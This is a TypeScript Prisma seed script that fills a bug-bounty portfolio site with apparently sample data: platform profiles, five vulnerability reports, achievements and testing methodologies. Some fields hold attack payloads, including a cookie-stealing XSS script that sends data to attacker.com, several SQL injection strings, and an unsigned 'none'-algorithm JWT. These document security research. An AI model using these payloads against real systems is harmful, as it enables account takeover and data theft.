import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();

export async function seedBugBountyData() {
  console.log('🐛 Seeding Bug Bounty data...');

  try {
    // Create Bug Bounty Stats
    const stats = await prisma.bugBountyStats.upsert({
      where: { id: 'default' },
      update: {},
      create: {
        id: 'default',
        totalBugs: 15,
        criticalBugs: 2,
        highBugs: 4,
        mediumBugs: 6,
        lowBugs: 2,
        informationalBugs: 1,
        totalReward: 12500.00,
        totalBounty: 12500.00,
        avgRewardPerBug: 833.33,
        cveAssigned: 3,
        avgResolutionDays: 12.5,
        fastestResolution: 4
      }
    });

    // Create Platforms
    const platforms = [
      {
        name: 'HackerOne',
        username: 'datrooster',
        profileUrl: 'https://hackerone.com/datrooster',
        reputation: 2847,
        rank: 'Top 5%',
        points: 2847,
        level: 'Legend',
        bugsSubmitted: 23,
        bugsAccepted: 18,
        bugsDuplicate: 3,
        bugsInformational: 2,
        totalEarnings: 8500.00,
        averageReward: 472.22,
        currency: 'USD',
        hallOfFame: 12,
        certificates: ['Security Expert', 'Top Researcher'],
        badges: ['Critical Bug', 'Fast Response', 'Team Player'],
        joinedAt: new Date('2022-03-15'),
        lastActive: new Date('2024-10-10'),
        activeMonths: 31,
        active: true,
        featured: true,
        publicProfile: true
      },
      {
        name: 'Bugcrowd',
        username: 'datrooster',
        profileUrl: 'https://bugcrowd.com/datrooster',
        reputation: 1543,
        rank: 'Top 10%',
        points: 1543,
        level: 'Master',
        bugsSubmitted: 15,
        bugsAccepted: 12,
        bugsDuplicate: 2,
        bugsInformational: 1,
        totalEarnings: 3200.00,
        averageReward: 266.67,
        currency: 'USD',
        hallOfFame: 5,
        certificates: ['Certified Researcher'],
        badges: ['SQL Expert', 'XSS Hunter'],
        joinedAt: new Date('2022-08-20'),
        lastActive: new Date('2024-10-08'),
        activeMonths: 26,
        active: true,
        featured: false,
        publicProfile: true
      },
      {
        name: 'Intigriti',
        username: 'datrooster',
        profileUrl: 'https://intigriti.com/profile/datrooster',
        reputation: 875,
        rank: 'Rising Star',
        points: 875,
        level: 'Advanced',
        bugsSubmitted: 8,
        bugsAccepted: 6,
        bugsDuplicate: 1,
        bugsInformational: 1,
        totalEarnings: 800.00,
        averageReward: 133.33,
        currency: 'EUR',
        hallOfFame: 2,
        certificates: [],
        badges: ['First Bug', 'Team Contributor'],
        joinedAt: new Date('2023-05-10'),
        lastActive: new Date('2024-09-25'),
        activeMonths: 17,
        active: true,
        featured: false,
        publicProfile: true
      }
    ];

    for (const platformData of platforms) {
      await prisma.platform.upsert({
        where: { name: platformData.name },
        update: platformData,
        create: platformData
      });
    }

    // Create Bug Reports
    const bugReports = [
      {
        title: 'SQL Injection in User Search Functionality',
        description: 'A SQL injection vulnerability was discovered in the user search feature, allowing attackers to extract sensitive database information including user credentials and personal data.',
        privateNotes: 'Used UNION-based injection technique. Extracted admin credentials successfully in testing environment.',
        severity: 'HIGH',
        category: 'SQL_INJECTION',
        cweId: 'CWE-89',
        cveId: 'CVE-2024-0001',
        program: 'TechCorp Bug Bounty',
        platform: 'HackerOne',
        programUrl: 'https://hackerone.com/techcorp',
        methodology: ['Manual Testing', 'Automated Scanning', 'Code Review'],
        tools: ['Burp Suite', 'SQLMap', 'Custom Scripts'],
        payload: 'UNION SELECT username,password FROM users--',
        impact: 'Complete database compromise possible. Sensitive user data including passwords could be extracted.',
        affectedAssets: ['api.techcorp.com', 'search.techcorp.com'],
        usersAffected: 15000,
        discoveredAt: new Date('2024-08-15'),
        reportedAt: new Date('2024-08-15'),
        firstResponseAt: new Date('2024-08-16'),
        resolvedAt: new Date('2024-08-28'),
        disclosedAt: new Date('2024-09-15'),
        status: 'DISCLOSED',
        resolution: 'Input validation and prepared statements implemented',
        reproducible: true,
        duplicate: false,
        reward: 2500.00,
        currency: 'USD',
        bonusReward: 500.00,
        screenshots: ['payload.png', 'database_output.png'],
        proofOfConcept: ['exploit.py', 'demo_video.mp4'],
        reportUrl: 'https://hackerone.com/reports/12345',
        publicUrl: 'https://hackerone.com/reports/12345',
        blogPostUrl: 'https://datrooster.dev/blog/sqli-techcorp',
        collaborators: [],
        credits: 'Security research by @datrooster'
      },
      {
        title: 'Stored XSS in Comment System',
        description: 'A stored cross-site scripting vulnerability in the comment system allows attackers to execute JavaScript in other users\' browsers, potentially leading to account takeover.',
        privateNotes: 'Bypassed HTML sanitization using encoded characters. Session cookies can be stolen.',
        severity: 'MEDIUM',
        category: 'XSS_STORED',
        cweId: 'CWE-79',
        program: 'StartupXYZ Security Program',
        platform: 'Bugcrowd',
        programUrl: 'https://bugcrowd.com/startupxyz',
        methodology: ['Manual Testing', 'Payload Fuzzing'],
        tools: ['Burp Suite', 'Custom XSS Payloads'],
        payload: '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>',
        impact: 'Session hijacking and account takeover possible for any user viewing malicious comments.',
        affectedAssets: ['blog.startupxyz.com', 'comments.startupxyz.com'],
        usersAffected: 5000,
        discoveredAt: new Date('2024-07-22'),
        reportedAt: new Date('2024-07-22'),
        firstResponseAt: new Date('2024-07-23'),
        resolvedAt: new Date('2024-08-05'),
        status: 'RESOLVED',
        resolution: 'Implemented proper HTML sanitization and CSP headers',
        reproducible: true,
        duplicate: false,
        reward: 800.00,
        currency: 'USD',
        screenshots: ['xss_payload.png', 'cookie_theft.png'],
        proofOfConcept: ['xss_demo.html'],
        reportUrl: 'https://bugcrowd.com/submissions/67890',
        collaborators: [],
        credits: 'Found by @datrooster'
      },
      {
        title: 'Authentication Bypass via JWT Token Manipulation',
        description: 'The application uses JWT tokens for authentication but fails to properly validate the signature, allowing attackers to forge tokens and access any user account.',
        privateNotes: 'Algorithm confusion attack successful. Changed alg to "none" and removed signature.',
        severity: 'CRITICAL',
        category: 'AUTHENTICATION_BYPASS',
        cweId: 'CWE-287',
        cveId: 'CVE-2024-0002',
        program: 'FinanceApp Security',
        platform: 'HackerOne',
        programUrl: 'https://hackerone.com/financeapp',
        methodology: ['JWT Analysis', 'Token Manipulation', 'Manual Testing'],
        tools: ['JWT.io', 'Burp Suite', 'Custom Scripts'],
        payload: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9.',
        impact: 'Complete authentication bypass. Attackers can impersonate any user including administrators.',
        affectedAssets: ['api.financeapp.com', 'admin.financeapp.com'],
        usersAffected: 50000,
        discoveredAt: new Date('2024-09-05'),
        reportedAt: new Date('2024-09-05'),
        firstResponseAt: new Date('2024-09-05'),
        resolvedAt: new Date('2024-09-12'),
        status: 'FIXED',
        resolution: 'Implemented proper JWT signature validation and algorithm whitelist',
        reproducible: true,
        duplicate: false,
        reward: 5000.00,
        currency: 'USD',
        bonusReward: 1000.00,
        screenshots: ['jwt_manipulation.png', 'admin_access.png'],
        proofOfConcept: ['jwt_bypass.py', 'token_forge.js'],
        reportUrl: 'https://hackerone.com/reports/54321',
        publicUrl: 'https://hackerone.com/reports/54321',
        blogPostUrl: 'https://datrooster.dev/blog/jwt-bypass-financeapp',
        collaborators: [],
        credits: 'Discovered and reported by @datrooster'
      },
      {
        title: 'IDOR in User Profile API',
        description: 'The user profile API endpoint fails to verify user authorization, allowing attackers to access and modify other users\' personal information by changing the user ID parameter.',
        privateNotes: 'Simple parameter manipulation. No rate limiting detected.',
        severity: 'HIGH',
        category: 'IDOR',
        cweId: 'CWE-639',
        program: 'SocialNet Bug Bounty',
        platform: 'Intigriti',
        programUrl: 'https://intigriti.com/programs/socialnet',
        methodology: ['Parameter Fuzzing', 'Manual Testing'],
        tools: ['Burp Suite', 'Custom Scripts'],
        payload: 'GET /api/user/profile?id=12345',
        impact: 'Unauthorized access to personal information including emails, phone numbers, and private messages.',
        affectedAssets: ['api.socialnet.com'],
        usersAffected: 25000,
        discoveredAt: new Date('2024-06-10'),
        reportedAt: new Date('2024-06-10'),
        firstResponseAt: new Date('2024-06-11'),
        resolvedAt: new Date('2024-06-20'),
        status: 'RESOLVED',
        resolution: 'Added proper authorization checks and user ownership validation',
        reproducible: true,
        duplicate: false,
        reward: 1200.00,
        currency: 'EUR',
        screenshots: ['idor_request.png', 'unauthorized_data.png'],
        proofOfConcept: ['idor_exploit.py'],
        reportUrl: 'https://intigriti.com/submissions/98765',
        collaborators: [],
        credits: '@datrooster'
      },
      {
        title: 'Business Logic Flaw in Discount System',
        description: 'The e-commerce platform\'s discount system allows stacking multiple promotional codes that shouldn\'t be combinable, resulting in negative prices and potential financial loss.',
        privateNotes: 'Discovered during checkout process testing. Can achieve 120% discount on high-value items.',
        severity: 'MEDIUM',
        category: 'BUSINESS_LOGIC',
        cweId: 'CWE-840',
        program: 'EcommercePro Security',
        platform: 'Bugcrowd',
        programUrl: 'https://bugcrowd.com/ecommercepro',
        methodology: ['Business Logic Testing', 'Manual Testing'],
        tools: ['Browser DevTools', 'Postman'],
        payload: 'Promo codes: SAVE50 + NEWUSER30 + FLASH40',
        impact: 'Financial loss due to negative pricing. Company pays customers to take products.',
        affectedAssets: ['checkout.ecommercepro.com', 'api.ecommercepro.com'],
        usersAffected: 0,
        discoveredAt: new Date('2024-05-18'),
        reportedAt: new Date('2024-05-18'),
        firstResponseAt: new Date('2024-05-19'),
        resolvedAt: new Date('2024-05-25'),
        status: 'FIXED',
        resolution: 'Implemented mutual exclusivity for promotional codes',
        reproducible: true,
        duplicate: false,
        reward: 600.00,
        currency: 'USD',
        screenshots: ['negative_price.png', 'checkout_flow.png'],
        proofOfConcept: ['discount_exploit.json'],
        reportUrl: 'https://bugcrowd.com/submissions/11111',
        collaborators: [],
        credits: 'Business logic flaw found by @datrooster'
      }
    ];

    for (const reportData of bugReports) {
      const existing = await prisma.bugReport.findFirst({
        where: { title: reportData.title }
      });
      
      if (!existing) {
        await prisma.bugReport.create({
          data: reportData as any
        });
      }
    }

    // Create Achievements
    const achievements = [
      {
        title: 'First Blood',
        description: 'Successfully submitted your first valid security vulnerability report.',
        category: 'FIRST_BUG',
        icon: '🎯',
        badgeUrl: null,
        color: '#ef4444',
        issuedBy: 'HackerOne',
        certificateUrl: 'https://hackerone.com/certificates/first-bug',
        verificationUrl: 'https://hackerone.com/verify/12345',
        criteria: 'Submit your first accepted vulnerability report',
        difficulty: 'EASY',
        rarity: 'Common',
        earnedAt: new Date('2022-03-20'),
        expiresAt: null,
        points: 100,
        monetaryValue: null,
        featured: true,
        publicVisible: true
      },
      {
        title: 'Critical Impact',
        description: 'Discovered a critical severity vulnerability that posed significant risk to the organization.',
        category: 'SEVERITY_MILESTONE',
        icon: '💀',
        badgeUrl: null,
        color: '#8b5cf6',
        issuedBy: 'HackerOne',
        certificateUrl: 'https://hackerone.com/certificates/critical-bug',
        verificationUrl: 'https://hackerone.com/verify/67890',
        criteria: 'Find and report a critical severity vulnerability',
        difficulty: 'HARD',
        rarity: 'Rare',
        earnedAt: new Date('2024-09-05'),
        expiresAt: null,
        points: 1000,
        monetaryValue: 500.00,
        featured: true,
        publicVisible: true
      },
      {
        title: 'Hall of Fame - Q3 2024',
        description: 'Recognized as a top contributor in Q3 2024 for outstanding security research contributions.',
        category: 'HALL_OF_FAME',
        icon: '🏆',
        badgeUrl: null,
        color: '#f59e0b',
        issuedBy: 'TechCorp',
        certificateUrl: 'https://techcorp.com/security/hall-of-fame/q3-2024',
        verificationUrl: null,
        criteria: 'Be among top 10 researchers in a quarter',
        difficulty: 'LEGENDARY',
        rarity: 'Epic',
        earnedAt: new Date('2024-10-01'),
        expiresAt: null,
        points: 2500,
        monetaryValue: 1000.00,
        featured: true,
        publicVisible: true
      },
      {
        title: 'CVE Author',
        description: 'Assigned a CVE number for a significant security vulnerability discovery.',
        category: 'CVE_ASSIGNMENT',
        icon: '📜',
        badgeUrl: null,
        color: '#10b981',
        issuedBy: 'MITRE Corporation',
        certificateUrl: null,
        verificationUrl: 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-0001',
        criteria: 'Have a vulnerability assigned a CVE number',
        difficulty: 'HARD',
        rarity: 'Rare',
        earnedAt: new Date('2024-09-15'),
        expiresAt: null,
        points: 1500,
        monetaryValue: null,
        featured: true,
        publicVisible: true
      },
      {
        title: '$10K Milestone',
        description: 'Earned over $10,000 in total bug bounty rewards across all platforms.',
        category: 'FINANCIAL_MILESTONE',
        icon: '💰',
        badgeUrl: null,
        color: '#059669',
        issuedBy: 'Bug Bounty Community',
        certificateUrl: null,
        verificationUrl: null,
        criteria: 'Earn $10,000+ in total bug bounty rewards',
        difficulty: 'MEDIUM',
        rarity: 'Uncommon',
        earnedAt: new Date('2024-08-30'),
        expiresAt: null,
        points: 500,
        monetaryValue: null,
        featured: false,
        publicVisible: true
      }
    ];

    for (const achievementData of achievements) {
      const existing = await prisma.achievement.findFirst({
        where: { title: achievementData.title }
      });
      
      if (!existing) {
        await prisma.achievement.create({
          data: achievementData as any
        });
      }
    }

    // Create Methodologies
    const methodologies = [
      {
        name: 'SQL Injection Testing',
        description: 'Comprehensive methodology for identifying and exploiting SQL injection vulnerabilities in web applications.',
        category: 'WEB_APPLICATION',
        steps: [
          '1. Identify input parameters and injection points',
          '2. Test for error-based SQL injection',
          '3. Test for blind boolean-based injection',
          '4. Test for time-based blind injection',
          '5. Test for UNION-based injection',
          '6. Enumerate database structure',
          '7. Extract sensitive data',
          '8. Document findings and impact'
        ],
        tools: ['Burp Suite', 'SQLMap', 'Custom Payloads', 'Browser DevTools'],
        prerequisites: ['Basic SQL knowledge', 'Understanding of HTTP requests', 'Web application architecture'],
        exampleTargets: ['Login forms', 'Search functionality', 'URL parameters', 'POST data'],
        examplePayloads: ["' OR 1=1--", "' UNION SELECT null,username,password FROM users--", "' AND SLEEP(5)--"],
        commonMistakes: ['Not testing all parameters', 'Ignoring time-based techniques', 'Missing proper documentation'],
        difficulty: 'INTERMEDIATE',
        estimatedTime: '2-4 hours per application',
        successRate: 25.5,
        resources: [
          'https://owasp.org/www-community/attacks/SQL_Injection',
          'https://portswigger.net/web-security/sql-injection',
          'https://sqlinjection.net/methodology'
        ],
        references: ['CVE-2024-0001', 'OWASP Top 10 A03'],
        timesUsed: 45,
        bugsFound: 12,
        lastUsed: new Date('2024-09-15'),
        featured: true,
        publicVisible: true
      },
      {
        name: 'XSS Discovery and Exploitation',
        description: 'Systematic approach to finding and exploiting cross-site scripting vulnerabilities.',
        category: 'WEB_APPLICATION',
        steps: [
          '1. Map application attack surface',
          '2. Identify reflection points',
          '3. Test for stored XSS locations',
          '4. Bypass input filters and WAF',
          '5. Craft effective payloads',
          '6. Test DOM-based XSS',
          '7. Demonstrate impact with PoC',
          '8. Report with appropriate remediation'
        ],
        tools: ['Burp Suite', 'XSS Hunter', 'BeEF', 'Custom JavaScript payloads'],
        prerequisites: ['JavaScript knowledge', 'HTML/CSS understanding', 'HTTP protocol basics'],
        exampleTargets: ['User input fields', 'URL parameters', 'HTTP headers', 'File uploads'],
        examplePayloads: ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>'],
        commonMistakes: ['Not testing all contexts', 'Using only basic payloads', 'Missing DOM XSS'],
        difficulty: 'BEGINNER',
        estimatedTime: '1-3 hours per application',
        successRate: 35.2,
        resources: [
          'https://owasp.org/www-community/attacks/xss/',
          'https://portswigger.net/web-security/cross-site-scripting',
          'https://brutelogic.com.br/blog/'
        ],
        references: ['CVE-2024-0003', 'OWASP Top 10 A07'],
        timesUsed: 67,
        bugsFound: 23,
        lastUsed: new Date('2024-07-22'),
        featured: true,
        publicVisible: true
      },
      {
        name: 'JWT Security Assessment',
        description: 'Complete methodology for analyzing and exploiting JSON Web Token implementations.',
        category: 'API_TESTING',
        steps: [
          '1. Capture and decode JWT tokens',
          '2. Analyze token structure and claims',
          '3. Test algorithm confusion attacks',
          '4. Test signature bypass techniques',
          '5. Check for sensitive information disclosure',
          '6. Test token lifetime and rotation',
          '7. Verify proper validation implementation',
          '8. Document security weaknesses'
        ],
        tools: ['JWT.io', 'jwt_tool', 'Burp Suite JWT Editor', 'Custom scripts'],
        prerequisites: ['Understanding of JWT structure', 'Basic cryptography knowledge', 'API testing experience'],
        exampleTargets: ['REST APIs', 'Single Page Applications', 'Mobile app backends', 'Microservices'],
        examplePayloads: ['Algorithm none attack', 'Key confusion attack', 'Signature stripping'],
        commonMistakes: ['Only testing obvious endpoints', 'Missing algorithm validation checks', 'Not testing token reuse'],
        difficulty: 'ADVANCED',
        estimatedTime: '3-6 hours per implementation',
        successRate: 18.7,
        resources: [
          'https://jwt.io/introduction/',
          'https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/',
          'https://tools.ietf.org/html/rfc7519'
        ],
        references: ['CVE-2024-0002', 'Auth0 JWT vulnerabilities'],
        timesUsed: 23,
        bugsFound: 4,
        lastUsed: new Date('2024-09-05'),
        featured: true,
        publicVisible: true
      }
    ];

    for (const methodologyData of methodologies) {
      await prisma.methodology.upsert({
        where: { name: methodologyData.name },
        update: methodologyData as any,
        create: methodologyData as any
      });
    }

    console.log('✅ Bug Bounty data seeded successfully!');
    console.log(`📊 Created: ${platforms.length} platforms, ${bugReports.length} bug reports, ${achievements.length} achievements, ${methodologies.length} methodologies`);

  } catch (error) {
    console.error('❌ Error seeding bug bounty data:', error);
    throw error;
  }
}